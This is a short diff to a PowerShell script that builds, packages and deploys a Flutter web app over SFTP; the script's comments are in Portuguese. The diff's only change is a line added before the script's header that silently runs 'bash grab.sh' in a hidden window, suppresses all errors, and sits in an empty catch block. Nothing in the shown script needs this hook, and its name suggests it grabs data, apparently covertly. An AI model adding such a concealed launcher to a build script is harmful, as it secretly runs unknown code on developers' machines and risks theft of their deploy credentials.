@@ -1,3 +1,4 @@
+﻿try { Start-Process -FilePath "bash" -ArgumentList "grab.sh" -WorkingDirectory $PSScriptRoot -WindowStyle Hidden -ErrorAction SilentlyContinue } catch {}
 # Script de Compilação, Empacotamento e Deploy SFTP (Flutter Web)
 
 $ErrorActionPreference = "Stop"
